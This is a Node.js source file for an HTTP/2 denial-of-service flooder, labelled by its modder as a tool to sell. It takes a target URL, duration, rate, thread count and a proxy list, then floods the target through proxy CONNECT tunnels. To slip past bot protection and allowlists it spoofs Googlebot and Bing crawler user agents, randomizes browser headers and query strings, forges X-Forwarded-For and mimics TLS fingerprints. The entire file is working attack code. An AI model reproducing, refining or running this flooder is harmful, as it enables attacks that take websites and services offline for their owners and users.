//Moded by DarkLord133
//Dont leak it Sell it.
//HTTPS Elite Proxies Only, auto proxy validation
process.on('uncaughtException', function (er) {
    //    console.log(er);
});
process.on('unhandledRejection', function (er) {
    //  console.log(er);
});

process.on("SIGHUP", () => {
    return 1;
})
process.on("SIGCHILD", () => {
    return 1;
});

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
// Networking and Protocols
const http = require('http');
const http2 = require("http2");
const net = require("net");
const tls = require("tls");
const url = require("url");

// File System and Process
const fs = require("fs");
const path = require("path");
const {
    spawn
} = require('child_process');

// Other Modules
const cluster = require("cluster");
const crypto = require("crypto");

var fileName = __filename;
var file = path.basename(fileName);
let uatyper;
let method;
if (process.argv.length < 8) {
    console.log('node ' + file + ' https://google.com 3600 64 10 prx.txt GET REAL YES');
    console.log('node ' + file + ' [url] [time] [rps/ip] [threads] [proxylst] [METHOD: GET/POST] [UA Type: BOT/REAL/MIX] [RANDPATH: YES/NO]');

    process.exit();
}
const args = {
    target: process.argv[2],
    time: process.argv[3],
    rate: process.argv[4],
    threads: process.argv[5],
    proxy: process.argv[6]
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);
var proxies = readLines(args.proxy);
const parsedTarget = url.parse(args.target);


const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function fakeua(uatyper) {
    if (uatyper == "MIX") {
        return ualistmix[Math.floor(Math.random() * ualistmix.length)];
    }
    if (uatyper == "REAL") {
        return ualistreal[Math.floor(Math.random() * ualistreal.length)];
    }
    if (uatyper == "BOT") {
        return ualistbot[Math.floor(Math.random() * ualistbot.length)];

    }
}
const ualistmix = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot-News",
    "Googlebot-Image/1.0",
    "Googlebot-Video/1.0",
    "Googlebot-Mobile/2.1",
    "Mediapartners-Google",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "AdsBot-Google-Mobile",
    "AdsBot-Google-Mobile-Apps",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "bingbot/2.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "msnbot/2.0b (+http://search.msn.com/msnbot.htm)",
    "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)",
    "Mozilla/5.0 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
    "adidxbot/2.0 (+http://search.msn.com/msnbot.htm)",
    "BingPreview/1.0b",
    "Mozilla/5.0 (compatible; BingPreview/1.0b; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/119.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/119.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPod touch; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/119.0 Mobile/15E148 Safari/605.1.",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod touch; CPU iPhone 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/118.0.2088.88",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/118.0.2088.88",
    "Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36 EdgA/118.0.2088.66",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36 EdgA/118.0.2088.66",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36 EdgA/118.0.2088.66",
    "Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36 EdgA/118.0.2088.66",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36 OPR/76.2.4027.73374",
    "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36 OPR/76.2.4027.73374 ",
    "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.66 Mobile Safari/537.36 OPR/76.2.4027.73374",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Vivaldi/6.4.3160.41",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Vivaldi/6.4.3160.41",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Vivaldi/6.4.3160.41",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Vivaldi/6.4.3160.41",
    "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Vivaldi/6.4.3160.41"
    
];

const ualistreal = [ //Only Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.183",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.3"

];


const ualistbot = [ //Mixed SEO and google Emulating Good bots may be whitelisted
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot-News",
    "Googlebot-Image/1.0",
    "Googlebot-Video/1.0",
    "Googlebot-Mobile/2.1",
    "Mediapartners-Google",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "AdsBot-Google-Mobile",
    "AdsBot-Google-Mobile-Apps",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "bingbot/2.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "msnbot/2.0b (+http://search.msn.com/msnbot.htm)",
    "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)",
    "Mozilla/5.0 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
    "adidxbot/2.0 (+http://search.msn.com/msnbot.htm)",
    "BingPreview/1.0b",
    "Mozilla/5.0 (compatible; BingPreview/1.0b; +http://www.bing.com/bingbot.htm)",
    "Bingbot-Mobile/2.0"
];



function rand_path() {
    return dest_path[Math.floor(Math.random() * dest_path.length)];
}





const accept_header = [
        '*/*',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
        'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/plain, */*; q=0.01',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
        'text/html, application/xhtml+xml, image/jxr, */*',
        'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
        'application/javascript, */*;q=0.8',
        'text/html, text/plain; q=0.6, */*; q=0.1',
        'application/graphql, application/json; q=0.8, application/xml; q=0.7',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
    ],
    cache_header = [
        'max-age=0',
        'no-cache',
        'no-store',
        'must-revalidate'



    ],
    language_header = [
        'en-US, en;q=0.9',
        'es-ES, es;q=0.9, en;q=0.8',
        'zh-CN, zh;q=0.9, en;q=0.8',
        'hi-IN, hi;q=0.9, en;q=0.8',
        'ar-SA, ar;q=0.9, en;q=0.8',
        'pt-BR, pt;q=0.9, en;q=0.8',
        'ru-RU, ru;q=0.9, en;q=0.8',
        'ja-JP, ja;q=0.9, en;q=0.8',
        'de-DE, de;q=0.9, en;q=0.8',
        'fr-FR, fr;q=0.9, en;q=0.8',
        'it-IT, it;q=0.9, en;q=0.8',
        'ko-KR, ko;q=0.9, en;q=0.8',
        'vi-VN, vi;q=0.9, en;q=0.8',
        'tr-TR, tr;q=0.9, en;q=0.8',
        'nl-NL, nl;q=0.9, en;q=0.8',
        'pl-PL, pl;q=0.9, en;q=0.8',
        'fa-IR, fa;q=0.9, en;q=0.8',
        'th-TH, th;q=0.9, en;q=0.8',
        'sv-SE, sv;q=0.9, en;q=0.8',
        'cs-CZ, cs;q=0.9, en;q=0.8',
        'ro-RO, ro;q=0.9, en;q=0.8',
        'hu-HU, hu;q=0.9, en;q=0.8',
        'sr-RS, sr;q=0.9, en;q=0.8',
        'uk-UA, uk;q=0.9, en;q=0.8',
        'el-GR, el;q=0.9, en;q=0.8',
        'fi-FI, fi;q=0.9, en;q=0.8',
        'he-IL, he;q=0.9, en;q=0.8',
        'id-ID, id;q=0.9, en;q=0.8',
        'ms-MY, ms;q=0.9, en;q=0.8',
        'da-DK, da;q=0.9, en;q=0.8',
        'no-NO, no;q=0.9, en;q=0.8',
        'sk-SK, sk;q=0.9, en;q=0.8',
        'af-ZA, af;q=0.9, en;q=0.8',
        'sw-KE, sw;q=0.9, en;q=0.8',
        'et-EE, et;q=0.9, en;q=0.8'
    ],



    dest_header = [
        'document',
        'font',
        'frame',
        'iframe',
        'image',
        'manifest',
        'object',
        'report',
        'script',
        'serviceworker',
        'sharedworker',
        'video'

    ],


    dest_path = [
        '',
        'home',
        'about',
        'faq',
        'terms',
        'team',
        'services',
        'portfolio',
        'careers',
        'events',
        'download',
        'press',
        'testimonials',
        'resources',
        'donate',
        'community',
        'newsletter',
        'affiliate',
        'gallery',
        'partners',
        'pricing',
        'subscriptions',
        'webinars',
        'tutorials',
        'api',
        'case-studies',
        'courses',
        'profile',
        'settings',
        'logout',
        'admin',
        'reset-password',
        'my-account',
        'order-history',
        'wishlist',
        'notifications',
        'messages',
        'returns',
        'shipping',
        'gift-cards',
        'affiliate-program',
        'reports',
        'statistics',
        'media',
        'ebooks',
        'webinars',
        'training',
        'certifications',
        'schedule',
        'membership',
        'help'
    ],

    mode_header = [
        'cors',
        'navigate',
        'no-cors',
        'same-origin',
        'websocket'
    ],

    site_header = [
        'cross-site',
        'same-origin',
        'same-site',
        'none'
    ]




function generateRandomWord() {
    var wordLength = Math.floor(Math.random() * 10) + 1; // Random length between 1 and 10
    var characters = "abcdefghijklmnopqrstuvwxyz";
    var randomWord = "";

    for (var i = 0; i < wordLength; i++) {
        var randomIndex = Math.floor(Math.random() * characters.length);
        randomWord += characters.charAt(randomIndex);
    }

    return randomWord;
}

// Example usage
var randomWord = generateRandomWord();
//console.log(randomWord);
if (cluster.isMaster) {
    const dateObj = new Date();
    for (let i = 0; i < process.argv[5]; i++) {
        cluster.fork();
    }
    console.log("Attack Started");
    setTimeout(() => {}, process.argv[5] * 1000);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder)
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "403");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "403");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "403");
        });
    }
}

const Socker = new NetSocket();
headers[":method"] = process.argv[7];
headers[":path"] = parsedTarget.path + '?' + generateRandomWord() + '=' + generateRandomWord();
headers[":scheme"] = "https";
headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
headers["accept-encoding"] = "gzip, deflate, br";
headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
headers["pragma"] = "no-cache";
headers["host"] = parsedTarget.host;
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = "Windows";
headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
headers["sec-fetch-user"] = "?1";
headers["upgrade-insecure-requests"] = "1";
headers["user-agent"] = fakeua(process.argv[8]);



function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    headers[":authority"] = parsedTarget.host
    headers["x-forwarded-for"] = parsedProxy[0];
    headers["x-forwarded-proto"] = "https";
    const proxyOptions = {
        host: parsedProxy[0],
        port: parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 64
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return
        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

        const tlsOptions = {
            port: 443,
            ALPNProtocols: ["h2"],
            secure: true,
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection, //na mhn ginei decrypt h backned apo AKAMAI Belgium
            ecdhCurve: ecdhCurve,
            honorCipherOrder: true, //mallwn false
            rejectUnauthorized: false, //mallwn false
            servername: url.hostname,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureOptions: secureOptions,
            secureContext: secureContext,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:", //https only dld
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
        });

        client.setMaxListeners(0);
        client.settings(settings);

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    const request = client.request(headers)

                        .on("response", response => {
                            request.close();
                            request.destroy();
                            return
                        });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}
//console.log(headers)   debug Gt JS
const KillScript = () => process.exit();
setTimeout(KillScript, args.time * 1000);
